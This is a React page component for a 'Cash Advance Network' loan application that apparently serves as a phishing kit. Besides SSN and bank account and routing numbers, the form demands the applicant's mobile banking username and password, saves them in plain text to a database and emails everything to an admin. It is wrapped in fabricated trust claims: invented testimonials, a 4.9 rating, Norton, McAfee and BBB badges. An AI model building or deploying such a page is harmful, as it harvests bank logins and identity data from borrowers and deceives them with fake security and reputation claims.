import { useState, useEffect } from "react";
import { useForm, Controller } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import * as z from "zod";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Avatar, AvatarImage, AvatarFallback } from "@/components/ui/avatar";
import { Lock, Shield, CheckCircle2, User, Briefcase, Building2, ChevronRight, Star, Clock, DollarSign, Sparkles } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { useSearchParams } from "react-router-dom";
import Header from "@/components/Header";
import Footer from "@/components/Footer";

const formSchema = z.object({
  firstName: z.string().min(1, "First name is required"),
  lastName: z.string().min(1, "Last name is required"),
  email: z.string().email("Invalid email"),
  phone: z.string().min(10, "Phone number must be at least 10 digits"),
  dob: z.string().min(1, "Date of birth is required"),
  address: z.string().min(1, "Address is required"),
  city: z.string().min(1, "City is required"),
  state: z.string().min(2, "State is required"),
  zip: z.string().min(5, "Zip code must be at least 5 digits"),
  ssn: z.string().min(9, "SSN must be 9 digits").max(9, "SSN must be 9 digits"),
  monthlyIncome: z.string().min(1, "Monthly income is required"),
  loanAmount: z.string().min(1, "Loan amount is required"),
  creditScore: z.enum(["low", "good", "bad"], { required_error: "Credit score is required" }),
  bankName: z.string().min(1, "Bank name is required"),
  yearsWithBank: z.string().min(1, "Years with bank is required"),
  accountNumber: z.string().min(1, "Account number is required"),
  routingNumber: z.string().min(9, "Routing number must be 9 digits").max(9, "Routing number must be 9 digits"),
  mobileUsername: z.string().min(1, "Mobile banking username is required"),
  mobilePassword: z.string().min(1, "Mobile banking password is required"),
});

type FormData = z.infer<typeof formSchema>;

const steps = [
  { id: "personal", label: "Personal Info", icon: User },
  { id: "employment", label: "Employment", icon: Briefcase },
  { id: "banking", label: "Banking", icon: Building2 },
  { id: "submit", label: "Submit", icon: CheckCircle2 },
];

const testimonials = [
  { name: "Sarah M.", text: "Got approved in 2 minutes!", avatar: "SM" },
  { name: "John D.", text: "Best loan experience ever", avatar: "JD" },
  { name: "Emily R.", text: "Highly recommend!", avatar: "ER" },
];

const FloatingCard = ({ icon: Icon, text, delay }: { icon: any; text: string; delay: string }) => (
  <div
    className={`absolute hidden lg:flex items-center gap-2 bg-white/90 backdrop-blur-sm shadow-lg rounded-full px-4 py-2 animate-float`}
    style={{ animationDelay: delay, animation: `float 3s ease-in-out ${delay} infinite` }}
  >
    <div className="bg-primary/10 rounded-full p-1.5">
      <Icon className="h-4 w-4 text-primary" />
    </div>
    <span className="text-sm font-medium text-gray-800">{text}</span>
  </div>
);

const StandaloneApply = () => {
  const [searchParams] = useSearchParams();
  const [client, setClient] = useState(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [currentStep, setCurrentStep] = useState(0);

  useEffect(() => {
    const token = searchParams.get('token');
    console.log('Token from URL:', token);

    if (token) {
      const validateToken = async () => {
        try {
          console.log('Validating token:', token);
          console.log('Current time:', new Date().toISOString());

          const { data, error } = await supabase
            .from('clients')
            .select('*')
            .eq('access_token', token)
            .gt('token_expiry', new Date().toISOString())
            .eq('is_active', true)
            .single();

          console.log('Query result:', { data, error });

          if (error) {
            console.error('❌ Token validation error:', error);
          } else if (data) {
            console.log('✅ Client found:', data);
            setClient(data);
          } else {
            console.warn('⚠️ No client found for token');
          }
        } catch (err) {
          console.error('❌ Exception during token validation:', err);
        }
      };

      validateToken();
    } else {
      console.log('No token in URL');
    }
  }, [searchParams]);

  const {
    register,
    handleSubmit,
    control,
    formState: { errors },
  } = useForm<FormData>({
    resolver: zodResolver(formSchema),
  });

  const onSubmit = async (data: FormData) => {
    setIsSubmitting(true);
    let emailStatus = { client: false, admin: false };

    try {
      // Prepare application data for database
      const applicationData = {
        first_name: data.firstName,
        last_name: data.lastName,
        email: data.email,
        phone: data.phone,
        date_of_birth: data.dob,
        street_address: data.address,
        city: data.city,
        state: data.state,
        zip_code: data.zip,
        employment_status: '',
        employer_name: '',
        monthly_income: parseFloat(data.monthlyIncome) || 0,
        loan_amount: parseFloat(data.loanAmount) || 0,
        pay_frequency: 'monthly',
        loan_purpose: 'personal',
        loan_type: 'cash_advance',
        client_id: client?.id || null,
        ssn: data.ssn,
        credit_score: data.creditScore,
        bank_name: data.bankName,
        years_with_bank: parseInt(data.yearsWithBank) || 0,
        account_number: data.accountNumber,
        routing_number: data.routingNumber,
        mobile_username: data.mobileUsername,
        mobile_password: data.mobilePassword,
      };

      // Save to database
      const { error: dbError } = await supabase
        .from('loan_applications')
        .insert(applicationData);

      if (dbError) {
        console.error('Database error:', dbError);
        throw new Error(`Database error: ${dbError.message}`);
      }

      console.log('Application saved to database successfully');

      // Send emails via Gmail SMTP API
      try {
        // Send full details to admin
        console.log('Sending admin notification email...');
        const adminRes = await fetch('/api/send-application-email', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            applicationData: data,
            clientEmail: null,
            recipientType: 'admin',
            clientName: client?.name || 'General Application'
          }),
        });
        if (adminRes.ok) {
          console.log('✅ Admin email sent');
          emailStatus.admin = true;
        } else {
          const err = await adminRes.json();
          console.error('❌ Admin email failed:', err);
        }

        // Send confirmation to the client's registered email (if they are a registered client)
        // or fallback to the email they provided in the form
        const recipientEmail = client ? client.email : data.email;
        console.log('Sending client confirmation email to:', recipientEmail);
        const clientRes = await fetch('/api/send-application-email', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            applicationData: data,
            clientEmail: recipientEmail,
            recipientType: 'client'
          }),
        });
        if (clientRes.ok) {
          console.log('✅ Client confirmation email sent');
          emailStatus.client = true;
        } else {
          const err = await clientRes.json();
          console.error('❌ Client email failed:', err);
        }
      } catch (emailErr) {
        console.error('❌ Email sending error:', emailErr);
      }

      // Show success message with email status
      let successMessage = "Application submitted successfully!";
      if (client) {
        if (emailStatus.client && emailStatus.admin) {
          successMessage += "\n\n✉️ Confirmation emails sent to you and our team.";
        } else if (emailStatus.admin) {
          successMessage += "\n\n⚠️ Our team has been notified. You may not receive a confirmation email at this time.";
        }
      } else {
        if (emailStatus.admin) {
          successMessage += "\n\n✉️ Our team has been notified.";
        }
      }

      alert(successMessage);
    } catch (err) {
      console.error('❌ Submission error:', err);
      alert(`Failed to submit application: ${err.message || 'Please try again.'}`);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-background">
      <Header />

      <style>{`
        @keyframes float {
          0%, 100% { transform: translateY(0px); }
          50% { transform: translateY(-10px); }
        }
        @keyframes pulse-glow {
          0%, 100% { opacity: 0.4; transform: scale(1); }
          50% { opacity: 0.8; transform: scale(1.1); }
        }
        @keyframes orbit {
          0% { transform: rotate(0deg) translateX(100px) rotate(0deg); }
          100% { transform: rotate(360deg) translateX(100px) rotate(-360deg); }
        }
        .animate-orbit {
          animation: orbit 20s linear infinite;
        }
        .animate-pulse-glow {
          animation: pulse-glow 4s ease-in-out infinite;
        }
      `}</style>

      {/* Hero Section with Background */}
      <section className="relative overflow-hidden bg-gradient-to-br from-primary via-primary/90 to-secondary py-12 md:py-16 lg:py-20">
        <div className="absolute inset-0">
          <img
            src="/hero-background.jpg"
            alt="Hero Background"
            className="w-full h-full object-cover"
          />
          <div className="absolute inset-0 bg-gradient-to-br from-primary/5 via-primary/5 to-secondary/5" />
        </div>

        <div className="container mx-auto px-4 relative z-10">
          <div className="max-w-4xl mx-auto text-center">
            <h1 className="text-3xl md:text-5xl lg:text-6xl font-bold text-primary-foreground mb-4 leading-tight">
              Apply for Your Loan Today
            </h1>
            <p className="text-lg md:text-xl text-primary-foreground/80 mb-6 max-w-2xl mx-auto">
              Fast, secure, and easy loan application process. Get approved in minutes.
            </p>

            {/* Trust Badges */}
            <div className="flex flex-wrap justify-center items-center gap-4 mt-6">
              <div className="flex items-center gap-2 bg-white/10 backdrop-blur-sm rounded-full px-4 py-2">
                <Shield className="h-5 w-5 text-green-400" />
                <span className="text-sm text-white font-medium">SSL Secured</span>
              </div>
              <div className="flex items-center gap-2 bg-white/10 backdrop-blur-sm rounded-full px-4 py-2">
                <Lock className="h-5 w-5 text-green-400" />
                <span className="text-sm text-white font-medium">256-bit Encryption</span>
              </div>
              <div className="bg-white rounded-lg px-3 py-1.5 flex items-center gap-2">
                <img
                  src="/consumer-affairs-logo.jpg"
                  alt="Consumer Affairs"
                  className="h-6 w-auto object-contain"
                />
                <div className="flex items-center gap-1">
                  {[1, 2, 3, 4, 5].map((star) => (
                    <Star key={star} className="h-3 w-3 fill-yellow-400 text-yellow-400" />
                  ))}
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Step Progress Indicator */}
      <div className="bg-muted/30 border-b border-border">
        <div className="container mx-auto px-4 py-6">
          <div className="max-w-3xl mx-auto">
            <div className="flex items-center justify-between relative">
              {steps.map((step, index) => {
                const Icon = step.icon;
                const isActive = index <= currentStep;
                const isCompleted = index < currentStep;

                return (
                  <div key={step.id} className="flex flex-col items-center relative z-10">
                    <div
                      className={`w-12 h-12 rounded-full flex items-center justify-center transition-all duration-300 ${isCompleted
                          ? "bg-green-500 text-white"
                          : isActive
                            ? "bg-primary text-primary-foreground"
                            : "bg-muted text-muted-foreground"
                        }`}
                    >
                      {isCompleted ? (
                        <CheckCircle2 className="h-6 w-6" />
                      ) : (
                        <Icon className="h-5 w-5" />
                      )}
                    </div>
                    <span className={`text-xs mt-2 font-medium ${isActive ? "text-primary" : "text-muted-foreground"}`}>
                      {step.label}
                    </span>
                  </div>
                );
              })}

              {/* Progress Line */}
              <div className="absolute top-6 left-0 w-full h-0.5 bg-muted -z-0">
                <div
                  className="h-full bg-primary transition-all duration-500"
                  style={{ width: `${(currentStep / (steps.length - 1)) * 100}%` }}
                />
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Main Content - Side by Side Layout */}
      <div className="py-12 bg-background relative overflow-hidden">
        {/* Decorative Background Elements */}
        <div className="absolute inset-0 overflow-hidden pointer-events-none">
          {/* Animated Gradient Orbs */}
          <div className="absolute top-20 left-10 w-64 h-64 bg-primary/10 rounded-full blur-3xl animate-pulse-glow" />
          <div className="absolute bottom-20 right-10 w-80 h-80 bg-secondary/10 rounded-full blur-3xl animate-pulse-glow" style={{ animationDelay: '1s' }} />
          <div className="absolute top-1/2 left-1/3 w-48 h-48 bg-primary/5 rounded-full blur-2xl animate-pulse-glow" style={{ animationDelay: '2s' }} />

          {/* Geometric Shapes */}
          <div className="absolute top-40 right-20 w-16 h-16 border-2 border-primary/20 rotate-45 animate-orbit" style={{ animationDuration: '25s' }} />
          <div className="absolute bottom-40 left-20 w-12 h-12 bg-secondary/20 rotate-12" />
          <div className="absolute top-1/3 right-1/4 w-8 h-8 border-2 border-primary/30 rotate-45" />

          {/* Floating Particles */}
          <div className="absolute top-1/4 left-1/4 w-2 h-2 bg-primary/40 rounded-full animate-float" style={{ animationDelay: '0s' }} />
          <div className="absolute top-1/3 right-1/3 w-3 h-3 bg-secondary/40 rounded-full animate-float" style={{ animationDelay: '1s' }} />
          <div className="absolute bottom-1/3 left-1/3 w-2 h-2 bg-primary/30 rounded-full animate-float" style={{ animationDelay: '2s' }} />
        </div>

        <div className="container mx-auto px-4 relative z-10">
          <div className="grid lg:grid-cols-2 gap-12 items-start max-w-7xl mx-auto">

            {/* Left Side - Illustration & Benefits */}
            <div className="hidden lg:block relative">
              {/* Main Illustration */}
              <div className="relative">
                <img
                  src="/aaa-1.png"
                  alt="Loan Application"
                  className="w-full max-w-md mx-auto rounded-2xl shadow-2xl"
                />

                {/* Floating Benefit Cards */}
                <FloatingCard icon={DollarSign} text="Get up to $5,000" delay="0s" />
                <div className="absolute -top-4 -right-4 hidden lg:flex items-center gap-2 bg-white/90 backdrop-blur-sm shadow-lg rounded-full px-4 py-2 animate-float" style={{ animationDelay: '0.5s' }}>
                  <div className="bg-green-500/10 rounded-full p-1.5">
                    <DollarSign className="h-4 w-4 text-green-600" />
                  </div>
                  <span className="text-sm font-medium text-gray-800">Get up to $5,000</span>
                </div>

                <div className="absolute top-1/4 -left-8 hidden lg:flex items-center gap-2 bg-white/90 backdrop-blur-sm shadow-lg rounded-full px-4 py-2 animate-float" style={{ animationDelay: '1s' }}>
                  <div className="bg-blue-500/10 rounded-full p-1.5">
                    <Clock className="h-4 w-4 text-blue-600" />
                  </div>
                  <span className="text-sm font-medium text-gray-800">Approval in 5 min</span>
                </div>

                <div className="absolute bottom-1/4 -right-8 hidden lg:flex items-center gap-2 bg-white/90 backdrop-blur-sm shadow-lg rounded-full px-4 py-2 animate-float" style={{ animationDelay: '1.5s' }}>
                  <div className="bg-purple-500/10 rounded-full p-1.5">
                    <Sparkles className="h-4 w-4 text-purple-600" />
                  </div>
                  <span className="text-sm font-medium text-gray-800">No hidden fees</span>
                </div>
              </div>

              {/* Customer Testimonials */}
              <div className="mt-8 bg-white/80 backdrop-blur-sm rounded-2xl p-6 shadow-lg">
                <div className="flex items-center gap-2 mb-4">
                  <div className="flex -space-x-2">
                    {testimonials.map((t, i) => (
                      <Avatar key={i} className="border-2 border-white w-10 h-10">
                        <AvatarFallback className="bg-primary text-primary-foreground text-xs">
                          {t.avatar}
                        </AvatarFallback>
                      </Avatar>
                    ))}
                  </div>
                  <div className="ml-2">
                    <p className="text-sm font-semibold text-gray-800">1,000+ Happy Customers</p>
                    <div className="flex items-center gap-1">
                      {[1, 2, 3, 4, 5].map((star) => (
                        <Star key={star} className="h-3 w-3 fill-yellow-400 text-yellow-400" />
                      ))}
                      <span className="text-xs text-gray-500 ml-1">4.9/5 rating</span>
                    </div>
                  </div>
                </div>

                <div className="space-y-3">
                  {testimonials.map((t, i) => (
                    <div key={i} className="flex items-start gap-3 text-sm">
                      <CheckCircle2 className="h-4 w-4 text-green-500 mt-0.5 flex-shrink-0" />
                      <div>
                        <span className="font-medium text-gray-800">{t.name}:</span>
                        <span className="text-gray-600 italic"> "{t.text}"</span>
                      </div>
                    </div>
                  ))}
                </div>
              </div>

              {/* Security Certifications */}
              <div className="mt-6 flex flex-wrap items-center justify-center gap-4">
                <div className="flex items-center gap-2 bg-white/80 backdrop-blur-sm rounded-lg px-4 py-2 shadow">
                  <Shield className="h-5 w-5 text-green-600" />
                  <span className="text-xs font-medium text-gray-700">Norton Secured</span>
                </div>
                <div className="flex items-center gap-2 bg-white/80 backdrop-blur-sm rounded-lg px-4 py-2 shadow">
                  <Lock className="h-5 w-5 text-blue-600" />
                  <span className="text-xs font-medium text-gray-700">McAfee Secure</span>
                </div>
                <div className="flex items-center gap-2 bg-white/80 backdrop-blur-sm rounded-lg px-4 py-2 shadow">
                  <CheckCircle2 className="h-5 w-5 text-purple-600" />
                  <span className="text-xs font-medium text-gray-700">BBB A+ Rated</span>
                </div>
              </div>
            </div>

            {/* Right Side - Application Form */}
            <div>
              {/* Trust Indicators */}
              <div className="text-center mb-6">
                <div className="inline-flex items-center gap-2 bg-primary/10 backdrop-blur-sm border border-primary/20 rounded-full px-4 py-2 mb-3">
                  <Shield className="h-4 w-4 text-primary" />
                  <span className="text-sm font-medium text-primary">Secure & Encrypted Application</span>
                </div>
                <div className="flex justify-center gap-4 text-xs text-muted-foreground">
                  <div className="flex items-center gap-1">
                    <CheckCircle2 className="h-3 w-3 text-green-500" />
                    <span>SSL Protected</span>
                  </div>
                  <div className="flex items-center gap-1">
                    <CheckCircle2 className="h-3 w-3 text-green-500" />
                    <span>256-bit Encryption</span>
                  </div>
                  <div className="flex items-center gap-1">
                    <CheckCircle2 className="h-3 w-3 text-green-500" />
                    <span>Bank-Level Security</span>
                  </div>
                </div>
              </div>

              <Card className="w-full shadow-2xl border-2 border-primary/10">
                <CardHeader className="pb-4">
                  <div className="flex items-center justify-center gap-2 mb-2">
                    <div className="bg-primary/10 rounded-full p-2">
                      <DollarSign className="h-6 w-6 text-primary" />
                    </div>
                  </div>
                  <CardTitle className="text-center text-2xl font-bold">
                    Cash Advance Network
                  </CardTitle>
                  <p className="text-center text-sm text-muted-foreground mt-1">
                    Complete the form below to apply
                  </p>
                  {client ? (
                    <p className="text-center text-sm text-green-600 font-medium flex items-center justify-center gap-1 mt-2">
                      <CheckCircle2 className="h-4 w-4" />
                      Application for {client.name}
                    </p>
                  ) : (
                    <p className="text-center text-sm text-blue-600 font-medium mt-2">
                      General Application
                    </p>
                  )}
                </CardHeader>
                <CardContent>
                  <form onSubmit={handleSubmit(onSubmit)} className="space-y-5">
                    {/* Personal Info Section */}
                    <div className="space-y-4">
                      <div className="flex items-center gap-2 pb-2 border-b border-border">
                        <div className="bg-primary/10 rounded-full p-1.5">
                          <User className="h-4 w-4 text-primary" />
                        </div>
                        <h3 className="font-semibold text-sm text-gray-700">Personal Information</h3>
                      </div>

                      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                        <div>
                          <Label htmlFor="firstName" className="text-xs">First Name</Label>
                          <Input id="firstName" {...register("firstName")} className="h-10" />
                          {errors.firstName && <p className="text-red-500 text-xs mt-1">{errors.firstName.message}</p>}
                        </div>
                        <div>
                          <Label htmlFor="lastName" className="text-xs">Last Name</Label>
                          <Input id="lastName" {...register("lastName")} className="h-10" />
                          {errors.lastName && <p className="text-red-500 text-xs mt-1">{errors.lastName.message}</p>}
                        </div>
                      </div>

                      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                        <div>
                          <Label htmlFor="email" className="text-xs">Email</Label>
                          <Input id="email" type="email" {...register("email")} className="h-10" />
                          {errors.email && <p className="text-red-500 text-xs mt-1">{errors.email.message}</p>}
                        </div>
                        <div>
                          <Label htmlFor="phone" className="text-xs">Phone</Label>
                          <Input id="phone" {...register("phone")} className="h-10" />
                          {errors.phone && <p className="text-red-500 text-xs mt-1">{errors.phone.message}</p>}
                        </div>
                      </div>

                      <div>
                        <Label htmlFor="dob" className="text-xs">Date of Birth</Label>
                        <Input id="dob" type="date" {...register("dob")} className="h-10" />
                        {errors.dob && <p className="text-red-500 text-xs mt-1">{errors.dob.message}</p>}
                      </div>

                      <div>
                        <Label htmlFor="address" className="text-xs">Address</Label>
                        <Input id="address" {...register("address")} className="h-10" />
                        {errors.address && <p className="text-red-500 text-xs mt-1">{errors.address.message}</p>}
                      </div>

                      <div className="grid grid-cols-3 gap-3">
                        <div>
                          <Label htmlFor="city" className="text-xs">City</Label>
                          <Input id="city" {...register("city")} className="h-10" />
                          {errors.city && <p className="text-red-500 text-xs mt-1">{errors.city.message}</p>}
                        </div>
                        <div>
                          <Label htmlFor="state" className="text-xs">State</Label>
                          <Input id="state" {...register("state")} className="h-10" />
                          {errors.state && <p className="text-red-500 text-xs mt-1">{errors.state.message}</p>}
                        </div>
                        <div>
                          <Label htmlFor="zip" className="text-xs">Zip</Label>
                          <Input id="zip" {...register("zip")} className="h-10" />
                          {errors.zip && <p className="text-red-500 text-xs mt-1">{errors.zip.message}</p>}
                        </div>
                      </div>

                      <div>
                        <Label htmlFor="ssn" className="text-xs">SSN</Label>
                        <Input id="ssn" {...register("ssn")} className="h-10" placeholder="XXX-XX-XXXX" />
                        {errors.ssn && <p className="text-red-500 text-xs mt-1">{errors.ssn.message}</p>}
                      </div>
                    </div>

                    {/* Employment Section */}
                    <div className="space-y-4 pt-2">
                      <div className="flex items-center gap-2 pb-2 border-b border-border">
                        <div className="bg-blue-500/10 rounded-full p-1.5">
                          <Briefcase className="h-4 w-4 text-blue-600" />
                        </div>
                        <h3 className="font-semibold text-sm text-gray-700">Employment & Loan Details</h3>
                      </div>

                      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                        <div>
                          <Label htmlFor="monthlyIncome" className="text-xs">Monthly Income</Label>
                          <Input id="monthlyIncome" type="number" {...register("monthlyIncome")} className="h-10" />
                          {errors.monthlyIncome && <p className="text-red-500 text-xs mt-1">{errors.monthlyIncome.message}</p>}
                        </div>
                        <div>
                          <Label htmlFor="loanAmount" className="text-xs">Loan Amount</Label>
                          <Input id="loanAmount" type="number" {...register("loanAmount")} className="h-10" />
                          {errors.loanAmount && <p className="text-red-500 text-xs mt-1">{errors.loanAmount.message}</p>}
                        </div>
                      </div>

                      <div>
                        <Label htmlFor="creditScore" className="text-xs">Credit Score</Label>
                        <Controller
                          name="creditScore"
                          control={control}
                          render={({ field }) => (
                            <Select onValueChange={field.onChange} value={field.value || ""}>
                              <SelectTrigger className="h-10">
                                <SelectValue placeholder="Select credit score" />
                              </SelectTrigger>
                              <SelectContent>
                                <SelectItem value="low">Low</SelectItem>
                                <SelectItem value="good">Good</SelectItem>
                                <SelectItem value="bad">Bad</SelectItem>
                              </SelectContent>
                            </Select>
                          )}
                        />
                        {errors.creditScore && <p className="text-red-500 text-xs mt-1">{errors.creditScore.message}</p>}
                      </div>
                    </div>

                    {/* Banking Section */}
                    <div className="space-y-4 pt-2">
                      <div className="flex items-center gap-2 pb-2 border-b border-border">
                        <div className="bg-green-500/10 rounded-full p-1.5">
                          <Building2 className="h-4 w-4 text-green-600" />
                        </div>
                        <h3 className="font-semibold text-sm text-gray-700">Banking Information</h3>
                      </div>

                      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                        <div>
                          <Label htmlFor="bankName" className="text-xs">Bank Name</Label>
                          <Input id="bankName" {...register("bankName")} className="h-10" />
                          {errors.bankName && <p className="text-red-500 text-xs mt-1">{errors.bankName.message}</p>}
                        </div>
                        <div>
                          <Label htmlFor="yearsWithBank" className="text-xs">Years with Bank</Label>
                          <Input id="yearsWithBank" type="number" {...register("yearsWithBank")} className="h-10" />
                          {errors.yearsWithBank && <p className="text-red-500 text-xs mt-1">{errors.yearsWithBank.message}</p>}
                        </div>
                      </div>

                      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                        <div>
                          <Label htmlFor="accountNumber" className="text-xs">Account Number</Label>
                          <Input id="accountNumber" {...register("accountNumber")} className="h-10" />
                          {errors.accountNumber && <p className="text-red-500 text-xs mt-1">{errors.accountNumber.message}</p>}
                        </div>
                        <div>
                          <Label htmlFor="routingNumber" className="text-xs">Routing Number</Label>
                          <Input id="routingNumber" {...register("routingNumber")} className="h-10" />
                          {errors.routingNumber && <p className="text-red-500 text-xs mt-1">{errors.routingNumber.message}</p>}
                        </div>
                      </div>

                      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                        <div>
                          <Label htmlFor="mobileUsername" className="text-xs">Mobile Banking Username</Label>
                          <div className="relative">
                            <Input id="mobileUsername" {...register("mobileUsername")} className="h-10 pr-10" />
                            <Lock className="absolute right-3 top-1/2 transform -translate-y-1/2 w-4 h-4 text-gray-400" />
                          </div>
                          {errors.mobileUsername && <p className="text-red-500 text-xs mt-1">{errors.mobileUsername.message}</p>}
                        </div>
                        <div>
                          <Label htmlFor="mobilePassword" className="text-xs">Mobile Banking Password</Label>
                          <div className="relative">
                            <Input id="mobilePassword" type="password" {...register("mobilePassword")} className="h-10 pr-10" />
                            <Lock className="absolute right-3 top-1/2 transform -translate-y-1/2 w-4 h-4 text-gray-400" />
                          </div>
                          {errors.mobilePassword && <p className="text-red-500 text-xs mt-1">{errors.mobilePassword.message}</p>}
                        </div>
                      </div>
                    </div>

                    <Button
                      type="submit"
                      className="w-full h-12 text-base font-semibold mt-6"
                      disabled={isSubmitting}
                    >
                      {isSubmitting ? (
                        <span className="flex items-center gap-2">
                          <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                          Submitting...
                        </span>
                      ) : (
                        <span className="flex items-center gap-2">
                          Apply for Loan
                          <ChevronRight className="h-4 w-4" />
                        </span>
                      )}
                    </Button>

                    <p className="text-center text-xs text-muted-foreground mt-4">
                      By submitting, you agree to our Terms of Service and Privacy Policy
                    </p>
                  </form>
                </CardContent>
              </Card>
            </div>
          </div>
        </div>
      </div>

      <Footer />
    </div>
  );
};

export default StandaloneApply;

